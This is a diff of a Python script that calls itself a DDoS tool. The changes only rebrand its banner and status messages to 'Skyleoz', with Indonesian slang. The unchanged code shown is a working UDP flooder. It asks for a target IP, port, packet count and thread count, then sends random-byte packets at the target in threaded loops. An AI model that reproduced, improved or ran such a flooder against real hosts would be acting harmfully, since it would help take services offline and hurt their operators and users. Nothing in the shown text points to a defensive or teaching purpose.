@@ -7,11 +7,11 @@ import threading
 import os
 
 os.system("clear")
-print("DDoS Tools By Yoooo [Beta Version]")
-print("Bismilah Tembus")
+print("DDoS By Skyleoz")
+print("tembus gak ya hmm?")
 ip = str(input(" Ip: "))
 port = int(input(" Port: "))
-choice = str(input(" Gas?(y/n): "))
+choice = str(input(" kanjut?(y/n): "))
 times = int(input(" Packets: "))
 threads = int(input(" Threads: "))
 def run():
@@ -23,9 +23,9 @@ def run():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-      print(i +" | Send!!!|")
+      print(i +" PAKET FROM Skyleoz")
     except:
-      print("[!] | Send!!! |")
+      print("DOWN? by Skyleoz")
 
 def run2():
   data = random._urandom(16)
